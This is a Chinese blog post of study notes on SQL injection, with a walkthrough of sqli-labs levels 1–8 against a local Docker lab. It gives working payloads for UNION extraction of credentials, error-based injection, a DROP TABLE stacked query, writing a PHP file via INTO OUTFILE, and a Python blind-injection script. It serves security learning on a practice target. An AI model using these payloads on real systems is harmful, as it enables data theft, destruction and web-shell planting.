---
title: sql注入
date: '2025-05-02 17:48:18'
updated: '2025-05-09 09:35:24'
permalink: /post/sql-injection-zkla2f.html
comments: true
toc: true
---



# sql注入

## sql注入

### SQL注入语句

1. 基础注入

   ```sql
   admin' OR '1'='1
   ```

   ```sql
   admin'--+      // 注释后面的内容
   ```

   ```sql
   admin'#       // 注释后面的内容
   ```
2. UNION查询注入
   通过关键字UNION将结果附加到原来的查询中

   ```sql
   ' UNION SELECT   username , password FROM users--
   ```

   如果列数不够，使用||将结构合成一列

   ```sql
   'UNION SELECT password || '-' || username FROM users
   ```

   要执行UNION攻击有两个要求

   * 原始查询返回了多少列
   * 从原始查询返回的哪些列具有合适的数据类型来保存注入查询的结果
3. 报错注入

   利用数据库的错误信息会回显在网页上的特点，获取数据库的内容

   1. floor() 报错注入
      该语句的输出字符长度为64个字符

      ```sql
      and (select 1 from 
      (select count(*),concat(payload),floor(rand(0)*2))x 
      from information_schema.tables group by x)a)
      ```

      ```sql
      union select count(*),0,concat((payload),floor(rand()*2))as a from information_schema.tables group by a limit 0,10 
      ```

      > **内层查询**
      >
      > ```sql
      > (select count(*),concat((payload),floor (rand(0)*2)) as x  
      > from information_schema.tables group by x)
      > ```
      >
      > `select count(*)`：统计每个分组后的行数，但是分组冲突无法统计，这里只是配合group by分组
      >
      > `concat((payload),floor(rand(*)*2)) x`：payload是希望获取的数据
      > `floor()`是向下取整
      > `rand(0)`是随机数生成函数，里面指定了种子0，生成固定的伪随机序列
      > `floor(rand(*)*2)`就会生成0或1的一个序列
      >
      > `group by x`：这个是对查询结果进行分组
      > 这个报错的核心就是这个和floor()，因为`floor(rand(*)*2)`会产生01的序列和前面的payload拼接
      > 在mysql中，执行group by语句和count时，会创建一个虚拟表，进行计数和分组
      >
      > group by 后面的字段和虚拟表进行对比
      > 如果存在，就计数加1
      > 如果不存在，就会插入，在插入时会再运算一次结果，因为rand的随机性，导致第二次运算的结果和第一次不一样，运算的结果存在虚拟表中，就会报错
      >
      > **外层查询**
      >
      > ```sql
      > (select 1 from ()a)
      > ```
      >
      > 最后的a就是内存查询的别名，让外层查询引用，这个是必要的
      >
   2. updatexml() 报错注入

      长度限制是32位

      ```sql
      and updatexml(1,payload,1)
      ```

   > `updatexml(xml_target, xpath_expr, new_value)`：该函数是用来更新XML文档的某个节点
   > `xml_target`  xml文档
   > `xpath_expr`  Xpath表达式，用来定位要更新的节点
   > `new_value`    新的节点值
   >
   > 报错的原因是当该函数执行时，如果出现xml文档路径错误就会报错
   >

   3. extractValue()  报错注入

      长度限制是32位

      ```sql
      and extractvalue(1, payload)
      ```

      > `extractvalue(xml_target, xpath_expr)`：该函数用来提取XML文档中某个节点的值
      > `xml_target`  xml文档
      > `xpath_expr`   Xpath表达式，用来定位要提取的节点
      >
      > 这个的报错原因和上面一样
      >
4. 盲注
   有时间盲注和布尔盲注
5. 堆叠查询注入

   允许多条sql语句同时执行

   ```
   '; DROP TABLE users; --
   ```

   ```sql
   SELECT * FROM users WHERE username = ''; DROP TABLE users; --';
   ```

   某些数据库不支持
6. 存储过程注入
7. cookie注入
8. md5注入
   查询命令

   ```sql
    select * from 'admin' where password=md5($pass,true)
   ```

   > md5($pass, true)：这个后面的true默认值是false，就会返回32字符的hex字符串
   >
   > 如果为true，就会返回hex的二进制数据（RAW格式）
   >

   ```
   ffifdyop
   md5值为：
   'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
   ```

#### 测试列数

1. order by测试

   ```
   /?id=1' order by 3 --+
   ```
2. union select 测试

   ```
   ?id=-1' union select 1,2,3--+
   ```

#### 判断类型

1. 数字型

```sql
select * from users where id = x
```

这种可以用`and 1 = 1` `and 1 = 2`判断

```
?id = x and 1=1     //页面正常
?id = x and 1=2     //页面报错，这说明存在数字型注入
```

2. 字符型

```sql
select * from users where id = 'x'
```

这种可以用`'and '1' = '1` `'and '1' = '2`判断

```
?id=1' and '1'='1	//页面正常
?id=1' and '1'='2	//页面报错，这说明存在字符型注入
```

* 字符型和数字型最大的区别就是要不要单引号闭合

#### 绕过小技巧

**双写绕过**
原理很简单，就是网站的过滤有时候可能没那么严谨，只会过滤掉一些关键词，我们找到这些关键词，如select，就可以用`seselectlect`，当过滤掉select时，剩下的字符串拼接在一起，就会恢复成原始有效的关键字，进行绕过

**空格过滤**

### sqli-lab

前几个都用的buu得靶场，做到第7题发现不是很好做，就自己搞一个

用docker下比较方便

```bash
docker pull acgpiano/sqli-labs
docker run -dt --name sqli-lab -p 5678:80 acgpiano/sqli-labs:latest
```

![image-20250427181305971](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250427181305971.png)

#### lab1

页面要输入一个id，直接在url后加?id=1
成功查询到名字，然后尝试注入

```
/?id=1'--      //报错
/?id=1'--+     //没报错
```

* 这里是因为sql中`--`注释符需要后面跟一个空格，在url编码中`--+`中的+相当于空格

然后尝试基础的注入，没成功，于是尝试UNION注入

```
/?id=1' order by 3 --+
```

* order by 是用来排序的sql语句，在注入中，可以用来探测列数，当报错了就是超出了列的数量

这里的3刚好是没报错，然后继续

```
?id=-1'union select 1,2,3--+
```

使用-1使前面的结果集为空，union合并后输出，发现2和3会输出到页面上，利用这个输出需要的内容

```
?id=-1'union select 1,database(),version()--+

Welcome    Dhakkan
Your Login name:security
Your Password:10.2.26-MariaDB-log
```

```
?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+

Welcome    Dhakkan
Your Login name:2
Your Password:emails,referers,uagents,users
```

> `group_concat(table_name) from information_schema.tables where table_schema='security'`
>
> `group_concat(table_name)`：这是一个聚合函数，将多行数据合并为一个字符串，table_name是要合并的列，默认这个函数会用逗号分隔结果
>
> `from information_schema.tables`：这个是mysql中的一个系统表，存储了数据库中所有表的信息，有以下几个列
>
> * `table_schema`：数据库名称
> * `table_name`：表名称
> * `table_type`：表类型（如 `BASE TABLE` 或 `VIEW`）
>
> `where table_schema='security'`：用来指定数据库

接下来要获取数据，猜测用户的账户应该会在users表中

```
?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
```

> 这个就差不多了
>
> `from information_schema.columns`：这个是一个系统表，存储了数据库中所有表的列信息，有以下几个重要列
>
> - `table_schema`：数据库名称。
> - `table_name`：表名称。
> - `column_name`：列名称。
> - `data_type`：列的数据类型。

```
?id=-1' union select 1,2,group_concat(username ,id , password) from users--+
```

最后将数据输出出来就行

#### lab2

这里记录一下上面没记得一个内容

**如何判断是字符型注入还是数字型注入**

1. 数字型

```sql
select * from users where id = x
```

这种可以用`and 1 = 1` `and 1 = 2`判断

```
?id = x and 1=1     //页面正常
?id = x and 1=2     //页面报错，这说明存在数字型注入
```

2. 字符型

```sql
select * from users where id = 'x'
```

这种可以用`'and '1' = '1` `'and '1' = '2`判断

```
?id=1' and '1'='1	//页面正常
?id=1' and '1'='2	//页面报错，这说明存在字符型注入
```

* 字符型和数字型最大的区别就是要不要单引号闭合

这题一就需要判断了，一开始用单引号发现报错了，直接加就没问题

```
?id=1 order by 3  	//获取列数
```

后面基本一样了

```
?id=-1 union select 1,2,3    					// 还是2，3
?id=-1 union select 1,database(),version() 		 //获取数据库名
?id=-1 union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='security'					 //获取表名
?id=-1 union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='users'						   //获取列名
?id=-1 union select 1,database(),group_concat(username,id,password) from users 
											  // 获取数据
```

#### lab3

~~发现也是数字型~~，看的不仔细orz
输入`?id=1'`的时候报错了，下意识以为是字符型，其实不是

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''8'') LIMIT 0,1' at line 1
```

这个报错其实是在单引号后面还有一个括号，要将括号补充上

```
?id=8') order by 3 --+
```

后面就一样的，只是加了个括号

#### lab4

输入单引号没用，尝试发现双引号报错`use near '"1"")`，猜测是还要用括号

```
?id=1")--+
```

成功注入

后续就一样了

#### lab5（报错注入）

也是检查什么类型，不过这个没有返回，只会显示成功进入，用数字型的尝试没有用，于是用字符型的

```
?id=1' and 1=2 --+
```

成功让页面报错，测试用报错注入

这里在网上学到了几个手工报错方法，都记录一下

1. `floor()` 报错注入
   该语句的输出字符长度为64个字符

   ```sql
    and (select 1 from (select count(*),concat(payload),floor(rand(0)*2))x from information_schema.tables group by x)a)
   ```

   ```sql
   union select count(*),0,concat((payload),floor(rand()*2))as a from information_schema.tables group by a limit 0,10 
   ```

   > **内层查询**
   >
   > ```sql
   > (select count(*),concat((payload),floor (rand(0)*2)) as x  
   > from information_schema.tables group by x)
   > ```
   >
   > `select count(*)`：统计每个分组后的行数，但是分组冲突无法统计，这里只是配合group by分组
   >
   > `concat((payload),floor(rand(*)*2)) x`：payload是希望获取的数据
   > `floor()`是向下取整
   > `rand(0)`是随机数生成函数，里面指定了种子0，生成固定的伪随机序列
   > `floor(rand(*)*2)`就会生成0或1的一个序列
   >
   > `group by x`：这个是对查询结果进行分组
   > 这个报错的核心就是这个和floor()，因为`floor(rand(*)*2)`会产生01的序列和前面的payload拼接
   > 在mysql中，执行`group by`语句和`count`时，会创建一个虚拟表，进行计数和分组
   >
   > `group by` 后面的字段和虚拟表进行对比
   > 如果存在，就计数加1
   > 如果不存在，就会插入，在插入时会再运算一次结果，因为rand的随机性，导致第二次运算的结果和第一次不一样，运算的结果存在虚拟表中，就会报错
   >
   > **外层查询**
   >
   > ```sql
   > (select 1 from ()a)
   > ```
   >
   > 最后的a就是内存查询的别名，让外层查询引用，这个是必要的
   >
2. `updatexml()` 报错注入

   长度限制是32位

   ```sql
   and updatexml(1,payload,1)
   ```

> `updatexml(xml_target, xpath_expr, new_value)`：该函数是用来更新XML文档的某个节点
> `xml_target`  xml文档
> `xpath_expr`  Xpath表达式，用来定位要更新的节点
> `new_value`    新的节点值
>
> 报错的原因是当该函数执行时，如果出现xml文档路径错误就会报错

3. `extractValue()`  报错注入

   长度限制是32位

   ```sql
   and extractvalue(1, payload)
   ```

   > `extractvalue(xml_target, xpath_expr)`：该函数用来提取XML文档中某个节点的值
   > `xml_target`  xml文档
   > `xpath_expr`   Xpath表达式，用来定位要提取的节点
   >
   > 这个的报错原因和上面一样
   >

然后开始尝试

1. `floor()`
   获取数据库名

   ```
   ?id=1'and (select 1 from 
   (select count(*),concat((database()),floor(rand(0)*2))x 
   from information_schema.tables group by x)a) --+
   ```

   ```
   Duplicate entry 'security1' for key 'group_key'
   ```

   然后获取表名

   ```
   ?id=1'union select count(*),0,concat((select table_name from information_schema.tables where 
   table_schema='security' limit 3,1),floor(rand(0)*2))as a from information_schema.tables group by a --+
   ```

   ```
   Duplicate entry 'users1' for key 'group_key'
   ```

   然后慢慢报列名

   ```
   ?id=1'union select count(*),0,concat((select (column_name) from information_schema.columns where 
   table_name='users' limit 1,1),floor(rand(0)*2))as a from information_schema.tables group by a --+
   ```

   ```
   id,username,password,ip,time
   ```

   然后就是从里面获取数据了
2. `updatexml()`

   ```
   ?id=1'and updatexml(1,concat(0x7e,database()),1) --+
   ```

   ```
   ?id=1'and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security')),1) --+
   ```

   `emails,referers,uagents,users`

   ```
   ?id=1'and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users')),1) --+
   ```

   `id,username,password,ip,time,US`

   ```
   ?id=1'and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,id,0x7e,password) from users)),1) --+
   ```
3. `extractValue()`

   ```
   ?id=1'and extractValue(1,concat(0x7e,database()))--+
   ```

   ```
   ?id=1'and extractValue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security')))--+
   ```

   ```
   ?id=1'and extractValue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users')))--+
   ```

   ```
   ?id=1'and extractValue(1,concat(0x7e,(select group_concat(username,0x7e,id,0x7e,password) from users)))--+
   ```

#### lab6（报错注入）

这题的区别就是用了 `""` 来闭合

![image-20250427170859210](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250427170859210.png)

后面都是和上一题一样的

#### lab7（写入文件）

没想到是 `'))` 闭合的

![image-20250427171556140](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250427171556140.png)

`order by 4` 报错，`order by 3` 是对的，测试使用 `union select` 发现没有回显的地方

报错注入也不行

![image-20250427171754440](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250427171754440.png)

这里的提示是这个 outfile ，要进行文件写

> 文件读写注入条件
>
> 1. 在配置文件中设置 `secure_file_priv=`
>
> * 当这个参数的值为 `null` 时，不允许读写
> * 当这个参数的值为 `/tmp` 时，可以在这个目录下进行读写
> * 当这个参数没有具体值时，表示不对读写进行限制
>
> 2. 登录的账户可能要有root权限
> 3. 知道服务器的路径

常用函数 `into dumpfile()` `into outfile()` `load_file()`

这里还要获取路径，这个可能就需要信息收集，这里也可以利用前面的题目来获取信息

```sql
union select 1,@@basedir,@@datadir
```

> `basedir()`：指定了安装MYSQL的路径
>
> `datadir()`：指定了数据文件路径

![image-20250427173327269](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250427173327269.png)

但是这里用buu的靶场还是不知道路径是哪里，所以还是得自己搭一个

利用下面得命令写入文件

```sql
UNION SELECT 1,2,"<?php phpinfo();?>" INTO OUTFILE "/var/www/html/Less-7/info.php"--+ 
```

但是页面还是会报之前错，不清楚能不能写入，在docker中查看，发现写到tmp文件夹的成功了，但是写道这个文件夹的确实没成功，然后看wp发现应该是靶机权限的问题，要给这个目录修改权限

```bash
chmod -R 777 var/www/html
```

将这个目录修改为所有人可读可写（777），然后就能写入文件了

![image-20250427182644653](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250427182644653.png)

![image-20250427182703187](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250427182703187.png)

#### lab8（bool盲注）

先常规测试，使用 `order by` 测试列数，发现4的时候没有显示，但是修改为3的时候会有输出，猜测可以使用这个来盲注

这题使用的是布尔盲注，记录一下布尔盲注的过程

1. 盲注库名长度

   ```sql
   and length((payload))>1
   ```
2. 利用ascii解数据库名称

   > `ascii()` 判断字符的ascii值
   >
   > `substr((payload),2,1)` 截取字符，表示从第二个字符开始截取一个字符
   >

   ```sql
   ascii(substr((payload),1,1))>1
   ```

   利用长度的值来判断

   ```
   0^(ascii(substr((payload),1,1))=110)
   ```

   利用和0异或来判断是否正确

到这题试试

```
?id=1' and length(database())=8--+
```

![image-20250428163042137](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250428163042137.png)

```
?id=1' and ascii(substr((database()),1,1))>1--+
```

![image-20250428162300618](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250428162300618.png)

![image-20250428162400158](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250428162400158.png)

写个脚本试试，研究了一下二分法

```python
import requests

url = "http://localhost:5678/Less-8/"

def get_length(payload):
    left, right = 1, 100  
    while left <= right:
        mid = (left + right) // 2
        test_payload = f"1' and length(({payload})) > {mid} --+"
        send_url = url + f"?id={test_payload}"
        res = requests.get(send_url)

        if "You are in" in res.text:
            left = mid + 1  
        else:
            right = mid - 1  
    return left

def get_char(payload, position):
    left, right = 0, 128  

    while left <= right:
        mid = (left + right) // 2
        test_payload = f"1' and ascii(substr(({payload}),{position},1)) > {mid} --+"
        send_url = url + f"?id={test_payload}"
        res = requests.get(send_url)

        if "You are in" in res.text:
            left = mid + 1  
        else:
            right = mid - 1  

    return left 

def blind_sqli(payload,length):
    result = ""
    for i in range(1, length + 1):
        ascii_val = get_char(payload, i)
        if ascii_val < 0:
            print(f"Failed to get char at position {i}")
            continue
        char = chr(ascii_val)
        result += char
    return result


payload = "database()"
length = get_length(payload)
print(length)
database_name = blind_sqli(payload,length)
print(f"{database_name}")
```

![image-20250428170325111](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250428170325111.png)

成功能获取到数据库名

```
select group_concat(table_name) from information_schema.tables where table_schema='security'
```

![image-20250428172056806](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250428172056806.png)

后续步骤都差不多了

```
select group_concat(column_name) from information_schema.columns where table_name='users'
```

![image-20250428172220367](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250428172220367.png)

```
select group_concat(username,0x7e,id,0x7e,password) from users
```

![image-20250428172320966](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250428172320966.png)

#### lab9（时间盲注）
